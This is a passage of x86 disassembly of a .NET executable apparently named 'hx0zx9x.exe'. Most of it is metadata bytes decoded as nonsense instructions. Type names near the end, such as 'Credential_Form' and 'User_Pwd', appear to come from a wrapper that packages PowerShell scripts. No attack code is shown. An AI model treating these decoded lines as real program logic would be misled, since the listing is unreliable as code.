  4062ab:	04 49                	add    $0x49,%al
  4062ad:	02 37                	add    (%edi),%dh
  4062af:	01 49 04             	add    %ecx,0x4(%ecx)
  4062b2:	5b                   	pop    %ebx
  4062b3:	21 51 07             	and    %edx,0x7(%ecx)
  4062b6:	59                   	pop    %ecx
  4062b7:	04 67                	add    $0x67,%al
  4062b9:	21 06                	and    %eax,(%esi)
  4062bb:	01 51 04             	add    %edx,0x4(%ecx)
  4062be:	83 21 58             	andl   $0x58,(%ecx)
  4062c1:	07                   	pop    %es
  4062c2:	61                   	popa
  4062c3:	04 c7                	add    $0xc7,%al
  4062c5:	17                   	pop    %ss
  4062c6:	ec                   	in     (%dx),%al
  4062c7:	00 69 04             	add    %ch,0x4(%ecx)
  4062ca:	95                   	xchg   %eax,%ebp
  4062cb:	21 5e 07             	and    %ebx,0x7(%esi)
  4062ce:	e1 03                	loope  0x4062d3
  4062d0:	9e                   	sahf
  4062d1:	21 4a 07             	and    %ecx,0x7(%edx)
  4062d4:	61                   	popa
  4062d5:	04 78                	add    $0x78,%al
  4062d7:	1a 65 07             	sbb    0x7(%ebp),%ah
  4062da:	71 04                	jno    0x4062e0
  4062dc:	b3 21                	mov    $0x21,%bl
  4062de:	33 01                	xor    (%ecx),%eax
  4062e0:	a9 01 93 20 33       	test   $0x33209301,%eax
  4062e5:	01 a9 01 bd 21 33    	add    %ebp,0x3321bd01(%ecx)
  4062eb:	01 e1                	add    %esp,%ecx
  4062ed:	03 9e 21 6c 07 e1    	add    -0x1ef893df(%esi),%ebx
  4062f3:	03 cd                	add    %ebp,%ecx
  4062f5:	21 74 07 e1          	and    %esi,-0x1f(%edi,%eax,1)
  4062f9:	03 d9                	add    %ecx,%ebx
  4062fb:	21 4a 07             	and    %ecx,0x7(%edx)
  4062fe:	81 04 49 02 65 04 e1 	addl   $0xe1046502,(%ecx,%ecx,2)
  406305:	03 07                	add    (%edi),%eax
  406307:	22 7b 07             	and    0x7(%ebx),%bh
  40630a:	91                   	xchg   %eax,%ecx
  40630b:	04 1e                	add    $0x1e,%al
  40630d:	22 9d 07 e1 03 58    	and    0x5803e107(%ebp),%bl
  406313:	1b 35 00 e1 03 3c    	sbb    0x3c03e100,%esi
  406319:	22 a2 07 99 04 66    	and    0x66049907(%edx),%ah
  40631f:	22 a8 07 99 04 70    	and    0x70049907(%eax),%ch
  406325:	22 9e 06 d1 03 b6    	and    -0x49fc2efa(%esi),%bl
  40632b:	14 35                	adc    $0x35,%al
  40632d:	00 59 03             	add    %bl,0x3(%ecx)
  406330:	49                   	dec    %ecx
  406331:	02 37                	add    (%edi),%dh
  406333:	01 a9 04 49 02 35    	add    %ebp,0x35024904(%ecx)
  406339:	00 08                	add    %cl,(%eax)
  40633b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40633e:	46                   	inc    %esi
  40633f:	00 08                	add    %cl,(%eax)
  406341:	00 20                	add    %ah,(%eax)
  406343:	00 4b 00             	add    %cl,0x0(%ebx)
  406346:	08 00                	or     %al,(%eax)
  406348:	24 00                	and    $0x0,%al
  40634a:	50                   	push   %eax
  40634b:	00 08                	add    %cl,(%eax)
  40634d:	00 28                	add    %ch,(%eax)
  40634f:	00 55 00             	add    %dl,0x0(%ebp)
  406352:	08 00                	or     %al,(%eax)
  406354:	2c 00                	sub    $0x0,%al
  406356:	5a                   	pop    %edx
  406357:	00 08                	add    %cl,(%eax)
  406359:	00 30                	add    %dh,(%eax)
  40635b:	00 5f 00             	add    %bl,0x0(%edi)
  40635e:	08 00                	or     %al,(%eax)
  406360:	34 00                	xor    $0x0,%al
  406362:	64 00 08             	add    %cl,%fs:(%eax)
  406365:	00 38                	add    %bh,(%eax)
  406367:	00 69 00             	add    %ch,0x0(%ecx)
  40636a:	08 00                	or     %al,(%eax)
  40636c:	3c 00                	cmp    $0x0,%al
  40636e:	6e                   	outsb  %ds:(%esi),(%dx)
  40636f:	00 08                	add    %cl,(%eax)
  406371:	00 40 00             	add    %al,0x0(%eax)
  406374:	73 00                	jae    0x406376
  406376:	08 00                	or     %al,(%eax)
  406378:	44                   	inc    %esp
  406379:	00 78 00             	add    %bh,0x0(%eax)
  40637c:	08 00                	or     %al,(%eax)
  40637e:	48                   	dec    %eax
  40637f:	00 7d 00             	add    %bh,0x0(%ebp)
  406382:	08 00                	or     %al,(%eax)
  406384:	4c                   	dec    %esp
  406385:	00 82 00 08 00 50    	add    %al,0x50000800(%edx)
  40638b:	00 87 00 08 00 54    	add    %al,0x54000800(%edi)
  406391:	00 8c 00 08 00 58 00 	add    %cl,0x580008(%eax,%eax,1)
  406398:	91                   	xchg   %eax,%ecx
  406399:	00 08                	add    %cl,(%eax)
  40639b:	00 5c 00 96          	add    %bl,-0x6a(%eax,%eax,1)
  40639f:	00 08                	add    %cl,(%eax)
  4063a1:	00 64 00 9f          	add    %ah,-0x61(%eax,%eax,1)
  4063a5:	00 08                	add    %cl,(%eax)
  4063a7:	00 68 00             	add    %ch,0x0(%eax)
  4063aa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4063ab:	00 08                	add    %cl,(%eax)
  4063ad:	00 6c 00 a9          	add    %ch,-0x57(%eax,%eax,1)
  4063b1:	00 08                	add    %cl,(%eax)
  4063b3:	00 70 00             	add    %dh,0x0(%eax)
  4063b6:	ae                   	scas   %es:(%edi),%al
  4063b7:	00 08                	add    %cl,(%eax)
  4063b9:	00 74 00 b3          	add    %dh,-0x4d(%eax,%eax,1)
  4063bd:	00 08                	add    %cl,(%eax)
  4063bf:	00 78 00             	add    %bh,0x0(%eax)
  4063c2:	b8 00 08 00 7c       	mov    $0x7c000800,%eax
  4063c7:	00 bd 00 08 00 80    	add    %bh,-0x7ffff800(%ebp)
  4063cd:	00 c2                	add    %al,%dl
  4063cf:	00 09                	add    %cl,(%ecx)
  4063d1:	00 e0                	add    %ah,%al
  4063d3:	00 9f 00 09 00 e4    	add    %bl,-0x1bfff700(%edi)
  4063d9:	00 46 00             	add    %al,0x0(%esi)
  4063dc:	09 00                	or     %eax,(%eax)
  4063de:	e8 00 4b 00 09       	call   0x940aee3
  4063e3:	00 ec                	add    %ch,%ah
  4063e5:	00 f6                	add    %dh,%dh
  4063e7:	01 09                	add    %ecx,(%ecx)
  4063e9:	00 f0                	add    %dh,%al
  4063eb:	00 fb                	add    %bh,%bl
  4063ed:	01 09                	add    %ecx,(%ecx)
  4063ef:	00 f8                	add    %bh,%al
  4063f1:	00 04 02             	add    %al,(%edx,%eax,1)
  4063f4:	09 00                	or     %eax,(%eax)
  4063f6:	fc                   	cld
  4063f7:	00 09                	add    %cl,(%ecx)
  4063f9:	02 09                	add    (%ecx),%cl
  4063fb:	00 00                	add    %al,(%eax)
  4063fd:	01 0e                	add    %ecx,(%esi)
  4063ff:	02 2e                	add    (%esi),%ch
  406401:	00 2b                	add    %ch,(%ebx)
  406403:	00 14 08             	add    %dl,(%eax,%ecx,1)
  406406:	2e 00 33             	add    %dh,%cs:(%ebx)
  406409:	00 14 08             	add    %dl,(%eax,%ecx,1)
  40640c:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  406410:	14 08                	adc    $0x8,%al
  406412:	2e 00 1b             	add    %bl,%cs:(%ebx)
  406415:	00 00                	add    %al,(%eax)
  406417:	08 2e                	or     %ch,(%esi)
  406419:	00 23                	add    %ah,(%ebx)
  40641b:	00 00                	add    %al,(%eax)
  40641d:	08 2e                	or     %ch,(%esi)
  40641f:	00 5b 00             	add    %bl,0x0(%ebx)
  406422:	26 08 2e             	or     %ch,%es:(%esi)
  406425:	00 63 00             	add    %ah,0x0(%ebx)
  406428:	2f                   	das
  406429:	08 2e                	or     %ch,(%esi)
  40642b:	00 43 00             	add    %al,0x0(%ebx)
  40642e:	1a 08                	sbb    (%eax),%cl
  406430:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  406434:	14 08                	adc    $0x8,%al
  406436:	83 00 ab             	addl   $0xffffffab,(%eax)
  406439:	00 46 00             	add    %al,0x0(%esi)
  40643c:	c3                   	ret
  40643d:	02 fb                	add    %bl,%bh
  40643f:	08 46 00             	or     %al,0x0(%esi)
  406442:	e0 0e                	loopne 0x406452
  406444:	03 07                	add    (%edi),%eax
  406446:	46                   	inc    %esi
  406447:	00 13                	add    %dl,(%ebx)
  406449:	00 e9                	add    %ch,%cl
  40644b:	02 65 00             	add    0x0(%ebp),%ah
  40644e:	eb 02                	jmp    0x406452
  406450:	04 03                	add    $0x3,%al
  406452:	43                   	inc    %ebx
  406453:	03 50 03             	add    0x3(%eax),%edx
  406456:	55                   	push   %ebp
  406457:	03 ed                	add    %ebp,%ebp
  406459:	03 2e                	add    (%esi),%ebp
  40645b:	04 54                	add    $0x54,%al
  40645d:	04 5b                	add    $0x5b,%al
  40645f:	04 99                	add    $0x99,%al
  406461:	04 06                	add    $0x6,%al
  406463:	05 34 05 e1 05       	add    $0x5e10534,%eax
  406468:	20 06                	and    %al,(%esi)
  40646a:	31 06                	xor    %eax,(%esi)
  40646c:	3d 06 57 06 60       	cmp    $0x60065706,%eax
  406471:	06                   	push   %es
  406472:	7c 06                	jl     0x40647a
  406474:	ae                   	scas   %es:(%edi),%al
  406475:	07                   	pop    %es
  406476:	07                   	pop    %es
  406477:	00 01                	add    %al,(%ecx)
  406479:	00 11                	add    %dl,(%ecx)
  40647b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40647e:	12 00                	adc    (%eax),%al
  406480:	0d 00 13 00 14       	or     $0x14001300,%eax
  406485:	00 14 00             	add    %dl,(%eax,%eax,1)
  406488:	1e                   	push   %ds
  406489:	00 15 00 20 00 00    	add    %dl,0x2000
  40648f:	00 a7 06 3c 01 00    	add    %ah,0x13c06(%edi)
  406495:	00 b7 06 41 01 00    	add    %dh,0x14106(%edi)
  40649b:	00 c2                	add    %al,%dl
  40649d:	06                   	push   %es
  40649e:	46                   	inc    %esi
  40649f:	01 00                	add    %eax,(%eax)
  4064a1:	00 d1                	add    %dl,%cl
  4064a3:	06                   	push   %es
  4064a4:	4b                   	dec    %ebx
  4064a5:	01 00                	add    %eax,(%eax)
  4064a7:	00 dc                	add    %bl,%ah
  4064a9:	06                   	push   %es
  4064aa:	3c 01                	cmp    $0x1,%al
  4064ac:	00 00                	add    %al,(%eax)
  4064ae:	ec                   	in     (%dx),%al
  4064af:	06                   	push   %es
  4064b0:	4f                   	dec    %edi
  4064b1:	01 00                	add    %eax,(%eax)
  4064b3:	00 f9                	add    %bh,%cl
  4064b5:	06                   	push   %es
  4064b6:	41                   	inc    %ecx
  4064b7:	01 00                	add    %eax,(%eax)
  4064b9:	00 0f                	add    %cl,(%edi)
  4064bb:	07                   	pop    %es
  4064bc:	41                   	inc    %ecx
  4064bd:	01 00                	add    %eax,(%eax)
  4064bf:	00 1d 07 46 01 00    	add    %bl,0x14607
  4064c5:	00 2c 07             	add    %ch,(%edi,%eax,1)
  4064c8:	41                   	inc    %ecx
  4064c9:	01 00                	add    %eax,(%eax)
  4064cb:	00 37                	add    %dh,(%edi)
  4064cd:	07                   	pop    %es
  4064ce:	53                   	push   %ebx
  4064cf:	01 00                	add    %eax,(%eax)
  4064d1:	00 4f 0c             	add    %cl,0xc(%edi)
  4064d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4064d5:	02 00                	add    (%eax),%al
  4064d7:	00 8f 0d ad 02 00    	add    %cl,0x2ad0d(%edi)
  4064dd:	00 9b 0d b2 02 00    	add    %bl,0x2b20d(%ebx)
  4064e3:	00 aa 0d b2 02 00    	add    %ch,0x2b20d(%edx)
  4064e9:	00 bb 0d b8 02 00    	add    %bh,0x2b80d(%ebx)
  4064ef:	00 c6                	add    %al,%dh
  4064f1:	0d 53 01 00 00       	or     $0x153,%eax
  4064f6:	cb                   	lret
  4064f7:	0d be 02 00 00       	or     $0x2be,%eax
  4064fc:	1e                   	push   %ds
  4064fd:	0d c3 02 00 00       	or     $0x2c3,%eax
  406502:	46                   	inc    %esi
  406503:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  406506:	00 00                	add    %al,(%eax)
  406508:	5b                   	pop    %ebx
  406509:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  40650c:	00 00                	add    %al,(%eax)
  40650e:	70 0a                	jo     0x40651a
  406510:	3c 01                	cmp    $0x1,%al
  406512:	00 00                	add    %al,(%eax)
  406514:	87 0a                	xchg   %ecx,(%edx)
  406516:	3c 01                	cmp    $0x1,%al
  406518:	00 00                	add    %al,(%eax)
  40651a:	9e                   	sahf
  40651b:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  40651e:	00 00                	add    %al,(%eax)
  406520:	b3 0a                	mov    $0xa,%bl
  406522:	3c 01                	cmp    $0x1,%al
  406524:	00 00                	add    %al,(%eax)
  406526:	c8 0a 3c 01          	enter  $0x3c0a,$0x1
  40652a:	00 00                	add    %al,(%eax)
  40652c:	df 0a                	fisttps (%edx)
  40652e:	3c 01                	cmp    $0x1,%al
  406530:	00 00                	add    %al,(%eax)
  406532:	f6 0a 3c             	testb  $0x3c,(%edx)
  406535:	01 00                	add    %eax,(%eax)
  406537:	00 0e                	add    %cl,(%esi)
  406539:	0b 3c 01             	or     (%ecx,%eax,1),%edi
  40653c:	00 00                	add    %al,(%eax)
  40653e:	1a 10                	sbb    (%eax),%dl
  406540:	4f                   	dec    %edi
  406541:	01 00                	add    %eax,(%eax)
  406543:	00 25 10 4b 01 00    	add    %ah,0x14b10
  406549:	00 1a                	add    %bl,(%edx)
  40654b:	10 4f 01             	adc    %cl,0x1(%edi)
  40654e:	00 00                	add    %al,(%eax)
  406550:	25 10 4b 01 02       	and    $0x2014b10,%eax
  406555:	00 05 00 03 00 01    	add    %al,0x1000300
  40655b:	00 06                	add    %al,(%esi)
  40655d:	00 03                	add    %al,(%ebx)
  40655f:	00 02                	add    %al,(%edx)
  406561:	00 07                	add    %al,(%edi)
  406563:	00 05 00 01 00 08    	add    %al,0x8000100
  406569:	00 05 00 02 00 09    	add    %al,0x9000200
  40656f:	00 07                	add    %al,(%edi)
  406571:	00 01                	add    %al,(%ecx)
  406573:	00 0a                	add    %cl,(%edx)
  406575:	00 07                	add    %al,(%edi)
  406577:	00 02                	add    %al,(%edx)
  406579:	00 0b                	add    %cl,(%ebx)
  40657b:	00 09                	add    %cl,(%ecx)
  40657d:	00 01                	add    %al,(%ecx)
  40657f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406582:	09 00                	or     %eax,(%eax)
  406584:	01 00                	add    %eax,(%eax)
  406586:	0f 00 0b             	str    (%ebx)
  406589:	00 02                	add    %al,(%edx)
  40658b:	00 0e                	add    %cl,(%esi)
  40658d:	00 0b                	add    %cl,(%ebx)
  40658f:	00 02                	add    %al,(%edx)
  406591:	00 11                	add    %dl,(%ecx)
  406593:	00 0d 00 02 00 12    	add    %cl,0x12000200
  406599:	00 0f                	add    %cl,(%edi)
  40659b:	00 02                	add    %al,(%edx)
  40659d:	00 13                	add    %dl,(%ebx)
  40659f:	00 11                	add    %dl,(%ecx)
  4065a1:	00 02                	add    %al,(%edx)
  4065a3:	00 18                	add    %bl,(%eax)
  4065a5:	00 13                	add    %dl,(%ebx)
  4065a7:	00 01                	add    %al,(%ecx)
  4065a9:	00 19                	add    %bl,(%ecx)
  4065ab:	00 13                	add    %dl,(%ebx)
  4065ad:	00 01                	add    %al,(%ecx)
  4065af:	00 1b                	add    %bl,(%ebx)
  4065b1:	00 15 00 02 00 1a    	add    %dl,0x1a000200
  4065b7:	00 15 00 02 00 1c    	add    %dl,0x1c000200
  4065bd:	00 17                	add    %dl,(%edi)
  4065bf:	00 01                	add    %al,(%ecx)
  4065c1:	00 1d 00 17 00 02    	add    %bl,0x2001700
  4065c7:	00 3f                	add    %bh,(%edi)
  4065c9:	00 19                	add    %bl,(%ecx)
  4065cb:	00 02                	add    %al,(%edx)
  4065cd:	00 4e 00             	add    %cl,0x0(%esi)
  4065d0:	1b 00                	sbb    (%eax),%eax
  4065d2:	02 00                	add    (%eax),%al
  4065d4:	4f                   	dec    %edi
  4065d5:	00 1d 00 02 00 50    	add    %bl,0x50000200
  4065db:	00 1f                	add    %bl,(%edi)
  4065dd:	00 02                	add    %al,(%edx)
  4065df:	00 51 00             	add    %dl,0x0(%ecx)
  4065e2:	21 00                	and    %eax,(%eax)
  4065e4:	02 00                	add    (%eax),%al
  4065e6:	52                   	push   %edx
  4065e7:	00 23                	add    %ah,(%ebx)
  4065e9:	00 02                	add    %al,(%edx)
  4065eb:	00 53 00             	add    %dl,0x0(%ebx)
  4065ee:	25 00 02 00 54       	and    $0x54000200,%eax
  4065f3:	00 27                	add    %ah,(%edi)
  4065f5:	00 02                	add    %al,(%edx)
  4065f7:	00 5b 00             	add    %bl,0x0(%ebx)
  4065fa:	29 00                	sub    %eax,(%eax)
  4065fc:	01 00                	add    %eax,(%eax)
  4065fe:	5c                   	pop    %esp
  4065ff:	00 29                	add    %ch,(%ecx)
  406601:	00 01                	add    %al,(%ecx)
  406603:	00 5e 00             	add    %bl,0x0(%esi)
  406606:	2b 00                	sub    (%eax),%eax
  406608:	02 00                	add    (%eax),%al
  40660a:	5d                   	pop    %ebp
  40660b:	00 2b                	add    %ch,(%ebx)
  40660d:	00 02                	add    %al,(%edx)
  40660f:	00 5f 00             	add    %bl,0x0(%edi)
  406612:	2d 00 01 00 60       	sub    $0x60000100,%eax
  406617:	00 2d 00 01 00 62    	add    %ch,0x62000100
  40661d:	00 2f                	add    %ch,(%edi)
  40661f:	00 02                	add    %al,(%edx)
  406621:	00 61 00             	add    %ah,0x0(%ecx)
  406624:	2f                   	das
  406625:	00 02                	add    %al,(%edx)
  406627:	00 63 00             	add    %ah,0x0(%ebx)
  40662a:	31 00                	xor    %eax,(%eax)
  40662c:	01 00                	add    %eax,(%eax)
  40662e:	64 00 31             	add    %dh,%fs:(%ecx)
  406631:	00 02                	add    %al,(%edx)
  406633:	00 65 00             	add    %ah,0x0(%ebp)
  406636:	33 00                	xor    (%eax),%eax
  406638:	01 00                	add    %eax,(%eax)
  40663a:	66 00 33             	data16 add %dh,(%ebx)
  40663d:	00 02                	add    %al,(%edx)
  40663f:	00 67 00             	add    %ah,0x0(%edi)
  406642:	35 00 01 00 68       	xor    $0x68000100,%eax
  406647:	00 35 00 02 00 69    	add    %dh,0x69000200
  40664d:	00 37                	add    %dh,(%edi)
  40664f:	00 01                	add    %al,(%ecx)
  406651:	00 6a 00             	add    %ch,0x0(%edx)
  406654:	37                   	aaa
  406655:	00 01                	add    %al,(%ecx)
  406657:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40665b:	00 02                	add    %al,(%edx)
  40665d:	00 6b 00             	add    %ch,0x0(%ebx)
  406660:	39 00                	cmp    %eax,(%eax)
  406662:	02 00                	add    (%eax),%al
  406664:	6d                   	insl   (%dx),%es:(%edi)
  406665:	00 3b                	add    %bh,(%ebx)
  406667:	00 01                	add    %al,(%ecx)
  406669:	00 6e 00             	add    %ch,0x0(%esi)
  40666c:	3b 00                	cmp    (%eax),%eax
  40666e:	01 00                	add    %eax,(%eax)
  406670:	70 00                	jo     0x406672
  406672:	3d 00 02 00 6f       	cmp    $0x6f000200,%eax
  406677:	00 3d 00 02 00 71    	add    %bh,0x71000200
  40667d:	00 3f                	add    %bh,(%edi)
  40667f:	00 01                	add    %al,(%ecx)
  406681:	00 72 00             	add    %dh,0x0(%edx)
  406684:	3f                   	aas
  406685:	00 02                	add    %al,(%edx)
  406687:	00 73 00             	add    %dh,0x0(%ebx)
  40668a:	41                   	inc    %ecx
  40668b:	00 01                	add    %al,(%ecx)
  40668d:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  406691:	00 02                	add    %al,(%edx)
  406693:	00 75 00             	add    %dh,0x0(%ebp)
  406696:	43                   	inc    %ebx
  406697:	00 01                	add    %al,(%ecx)
  406699:	00 76 00             	add    %dh,0x0(%esi)
  40669c:	43                   	inc    %ebx
  40669d:	00 40 14             	add    %al,0x14(%eax)
  4066a0:	79 15                	jns    0x4066b7
  4066a2:	33 1c 26             	xor    (%esi,%eiz,1),%ebx
  4066a5:	03 08                	add    (%eax),%ecx
  4066a7:	04 19                	add    $0x19,%al
  4066a9:	04 ab                	add    $0xab,%al
  4066ab:	04 41                	add    $0x41,%al
  4066ad:	05 49 05 51 05       	add    $0x5510549,%eax
  4066b2:	95                   	xchg   %eax,%ebp
  4066b3:	06                   	push   %es
  4066b4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4066b5:	06                   	push   %es
  4066b6:	e0 06                	loopne 0x4066be
  4066b8:	f5                   	cmc
  4066b9:	06                   	push   %es
  4066ba:	04 01                	add    $0x1,%al
  4066bc:	03 00                	add    (%eax),%eax
  4066be:	f4                   	hlt
  4066bf:	01 01                	add    %eax,(%ecx)
  4066c1:	00 04 02             	add    %al,(%edx,%eax,1)
  4066c4:	3f                   	aas
  4066c5:	00 43 07             	add    %al,0x7(%ebx)
  4066c8:	02 00                	add    (%eax),%al
  4066ca:	00 01                	add    %al,(%ecx)
  4066cc:	4b                   	dec    %ebx
  4066cd:	00 a0 07 02 00 00    	add    %ah,0x207(%eax)
  4066d3:	01 69 00             	add    %ebp,0x0(%ecx)
  4066d6:	6c                   	insb   (%dx),%es:(%edi)
  4066d7:	09 03                	or     %eax,(%ebx)
  4066d9:	00 00                	add    %al,(%eax)
  4066db:	01 6b 00             	add    %ebp,0x0(%ebx)
  4066de:	79 09                	jns    0x4066e9
  4066e0:	03 00                	add    (%eax),%eax
  4066e2:	04 80                	add    $0x80,%al
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	02 00                	add    (%eax),%al
  4066e8:	0f 00 00             	sldt   (%eax)
	...
  4066f3:	00 25 14 00 00 04    	add    %ah,0x4000014
	...
  406701:	00 00                	add    %al,(%eax)
  406703:	00 01                	add    %al,(%ecx)
  406705:	00 29                	add    %ch,(%ecx)
  406707:	01 00                	add    %eax,(%eax)
  406709:	00 00                	add    %al,(%eax)
  40670b:	00 03                	add    %al,(%ebx)
	...
  406715:	00 00                	add    %al,(%eax)
  406717:	00 0a                	add    %cl,(%edx)
  406719:	00 4f 01             	add    %cl,0x1(%edi)
  40671c:	00 00                	add    %al,(%eax)
  40671e:	00 00                	add    %al,(%eax)
  406720:	04 00                	add    $0x0,%al
	...
  40672a:	00 00                	add    %al,(%eax)
  40672c:	01 00                	add    %eax,(%eax)
  40672e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40672f:	01 00                	add    %eax,(%eax)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40673e:	00 00                	add    %al,(%eax)
  406740:	01 00                	add    %eax,(%eax)
  406742:	32 01                	xor    (%ecx),%al
  406744:	00 00                	add    %al,(%eax)
  406746:	00 00                	add    %al,(%eax)
  406748:	04 00                	add    $0x0,%al
	...
  406752:	00 00                	add    %al,(%eax)
  406754:	b2 01                	mov    $0x1,%dl
  406756:	83 08 00             	orl    $0x0,(%eax)
  406759:	00 00                	add    %al,(%eax)
  40675b:	00 00                	add    %al,(%eax)
  40675d:	00 00                	add    %al,(%eax)
  40675f:	00 01                	add    %al,(%ecx)
  406761:	00 00                	add    %al,(%eax)
  406763:	00 96 22 00 00 03    	add    %dl,0x3000022(%esi)
  406769:	00 02                	add    %al,(%edx)
  40676b:	00 04 00             	add    %al,(%eax,%eax,1)
  40676e:	02 00                	add    (%eax),%al
  406770:	05 00 02 00 06       	add    $0x6000200,%eax
  406775:	00 02                	add    %al,(%edx)
  406777:	00 0b                	add    %cl,(%ebx)
  406779:	00 0a                	add    %cl,(%edx)
  40677b:	00 0d 00 0c 00 0f    	add    %cl,0xf000c00
  406781:	00 0e                	add    %cl,(%esi)
  406783:	00 10                	add    %dl,(%eax)
  406785:	00 0e                	add    %cl,(%esi)
  406787:	00 13                	add    %dl,(%ebx)
  406789:	00 12                	add    %dl,(%edx)
  40678b:	00 16                	add    %dl,(%esi)
  40678d:	00 15 00 21 00 ff    	add    %dl,0xff002100
  406793:	02 2f                	add    (%edi),%ch
  406795:	02 97 07 00 00 00    	add    0x7(%edi),%dl
  40679b:	00 00                	add    %al,(%eax)
  40679d:	3c 4d                	cmp    $0x4d,%al
  40679f:	6f                   	outsl  %ds:(%esi),(%dx)
  4067a0:	64 75 6c             	fs jne 0x40680f
  4067a3:	65 3e 00 68 78       	gs add %ch,%ds:0x78(%eax)
  4067a8:	30 7a 78             	xor    %bh,0x78(%edx)
  4067ab:	39 78 2e             	cmp    %edi,0x2e(%eax)
  4067ae:	65 78 65             	gs js  0x406816
  4067b1:	00 43 72             	add    %al,0x72(%ebx)
  4067b4:	65 64 65 6e          	gs fs outsb %gs:(%esi),(%dx)
  4067b8:	74 69                	je     0x406823
  4067ba:	61                   	popa
  4067bb:	6c                   	insb   (%dx),%es:(%edi)
  4067bc:	5f                   	pop    %edi
  4067bd:	46                   	inc    %esi
  4067be:	6f                   	outsl  %ds:(%esi),(%dx)
  4067bf:	72 6d                	jb     0x40682e
  4067c1:	00 4d 6f             	add    %cl,0x6f(%ebp)
  4067c4:	64 75 6c             	fs jne 0x406833
  4067c7:	65 4e                	gs dec %esi
  4067c9:	61                   	popa
  4067ca:	6d                   	insl   (%dx),%es:(%edi)
  4067cb:	65 53                	gs push %ebx
  4067cd:	70 61                	jo     0x406830
  4067cf:	63 65 00             	arpl   %esp,0x0(%ebp)
  4067d2:	43                   	inc    %ebx
  4067d3:	52                   	push   %edx
  4067d4:	45                   	inc    %ebp
  4067d5:	44                   	inc    %esp
  4067d6:	55                   	push   %ebp
  4067d7:	49                   	dec    %ecx
  4067d8:	5f                   	pop    %edi
  4067d9:	49                   	dec    %ecx
  4067da:	4e                   	dec    %esi
  4067db:	46                   	inc    %esi
  4067dc:	4f                   	dec    %edi
  4067dd:	00 43 52             	add    %al,0x52(%ebx)
  4067e0:	45                   	inc    %ebp
  4067e1:	44                   	inc    %esp
  4067e2:	55                   	push   %ebp
  4067e3:	49                   	dec    %ecx
  4067e4:	5f                   	pop    %edi
  4067e5:	46                   	inc    %esi
  4067e6:	4c                   	dec    %esp
  4067e7:	41                   	inc    %ecx
  4067e8:	47                   	inc    %edi
  4067e9:	53                   	push   %ebx
  4067ea:	00 43 72             	add    %al,0x72(%ebx)
  4067ed:	65 64 55             	gs fs push %ebp
  4067f0:	49                   	dec    %ecx
  4067f1:	5f                   	pop    %edi
  4067f2:	52                   	push   %edx
  4067f3:	65 74 75             	gs je  0x40686b
  4067f6:	72 6e                	jb     0x406866
  4067f8:	43                   	inc    %ebx
  4067f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4067fa:	64 65 73 00          	fs gs jae 0x4067fe
  4067fe:	55                   	push   %ebp
  4067ff:	73 65                	jae    0x406866
  406801:	72 5f                	jb     0x406862
  406803:	50                   	push   %eax
  406804:	77 64                	ja     0x40686a
  406806:	00 4d 61             	add    %cl,0x61(%ebp)
  406809:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406810:	65 52                	gs push %edx
  406812:	61                   	popa
  406813:	77 55                	ja     0x40686a
  406815:	49                   	dec    %ecx
  406816:	00 49 6e             	add    %cl,0x6e(%ecx)
  406819:	70 75                	jo     0x406890
  40681b:	74 5f                	je     0x40687c
  40681d:	42                   	inc    %edx
  40681e:	6f                   	outsl  %ds:(%esi),(%dx)
  40681f:	78 00                	js     0x406821
  406821:	43                   	inc    %ebx
  406822:	68 6f 69 63 65       	push   $0x6563696f
  406827:	5f                   	pop    %edi
  406828:	42                   	inc    %edx
  406829:	6f                   	outsl  %ds:(%esi),(%dx)
  40682a:	78 00                	js     0x40682c
  40682c:	52                   	push   %edx
  40682d:	65 61                	gs popa
  40682f:	64 4b                	fs dec %ebx
  406831:	65 79 5f             	gs jns 0x406893
  406834:	42                   	inc    %edx
  406835:	6f                   	outsl  %ds:(%esi),(%dx)
  406836:	78 00                	js     0x406838
  406838:	4b                   	dec    %ebx
  406839:	65 79 62             	gs jns 0x40689e
  40683c:	6f                   	outsl  %ds:(%esi),(%dx)
  40683d:	61                   	popa
  40683e:	72 64                	jb     0x4068a4
  406840:	5f                   	pop    %edi
  406841:	46                   	inc    %esi
  406842:	6f                   	outsl  %ds:(%esi),(%dx)
  406843:	72 6d                	jb     0x4068b2
  406845:	00 50 72             	add    %dl,0x72(%eax)
  406848:	6f                   	outsl  %ds:(%esi),(%dx)
  406849:	67 72 65             	addr16 jb 0x4068b1
  40684c:	73 73                	jae    0x4068c1
  40684e:	5f                   	pop    %edi
  40684f:	46                   	inc    %esi
  406850:	6f                   	outsl  %ds:(%esi),(%dx)
  406851:	72 6d                	jb     0x4068c0
  406853:	00 50 72             	add    %dl,0x72(%eax)
  406856:	6f                   	outsl  %ds:(%esi),(%dx)
  406857:	67 72 65             	addr16 jb 0x4068bf
  40685a:	73 73                	jae    0x4068cf
  40685c:	5f                   	pop    %edi
  40685d:	44                   	inc    %esp
  40685e:	61                   	popa
  40685f:	74 61                	je     0x4068c2
  406861:	00 43 6f             	add    %al,0x6f(%ebx)
  406864:	6e                   	outsb  %ds:(%esi),(%dx)
  406865:	73 6f                	jae    0x4068d6
  406867:	6c                   	insb   (%dx),%es:(%edi)
  406868:	65 5f                	gs pop %edi
  40686a:	49                   	dec    %ecx
  40686b:	6e                   	outsb  %ds:(%esi),(%dx)
  40686c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40686e:	00 46 69             	add    %al,0x69(%esi)
  406871:	6c                   	insb   (%dx),%es:(%edi)
  406872:	65 54                	gs push %esp
  406874:	79 70                	jns    0x4068e6
  406876:	65 00 53 54          	add    %dl,%gs:0x54(%ebx)
  40687a:	44                   	inc    %esp
